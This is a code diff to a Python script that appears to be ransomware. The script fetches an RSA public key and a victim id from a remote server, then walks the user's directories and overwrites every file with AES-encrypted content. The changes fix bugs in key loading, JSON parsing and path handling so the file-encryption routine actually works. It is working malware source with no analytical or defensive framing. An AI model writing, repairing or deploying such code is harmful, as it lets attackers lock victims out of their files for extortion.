@@ -52,17 +52,22 @@ def encrypt_file(file_path, public_key):
         encrypted_file.write(iv + encrypted_aes_key + encrypted_data)
 
 
-def encrypt_directory(directory_path, public_key_pem_path):
-    # Load public key
-    with open(public_key_pem_path, "rb") as key_file:
-        public_key = serialization.load_pem_public_key(
-            key_file.read(), backend=default_backend())
+def encrypt_directory(directory_path, public_key_data):
+    # Assuming 'public_key_data' is a Unicode string, encode it to bytes
+    public_key_bytes = public_key_data.encode('utf-8')
 
+    # Load public key from the bytes
+    public_key = serialization.load_pem_public_key(
+        public_key_bytes, backend=default_backend()
+    )
+
+    # Continue with the encryption as before
     for root, dirs, files in os.walk(directory_path):
         for file in files:
-            file_path = path.join(root, file)
+            file_path = os.path.join(root, file)
             encrypt_file(file_path, public_key)
             print(f"Encrypted {file_path}")
+
 
 
 def fetch_key():
@@ -76,7 +81,9 @@ def fetch_key():
         # Parse JSON from the response
         data = response.json()
         print(data)
-        return data.publickey, data.id
+        id = data['id']
+        public_key = data['publickey']
+        return public_key, id
     else:
         print(f'Failed to retrieve data: status code {response.status_code}')
 
@@ -98,7 +105,7 @@ def main():
 
     for directory in user_dirs:
         if os.path.exists(directory):
-            encrypt_directory(directory, "keys/public_key.pem")
+            encrypt_directory(directory, public_key)
         else:
             print(f"Directory does not exist: {directory}")
 
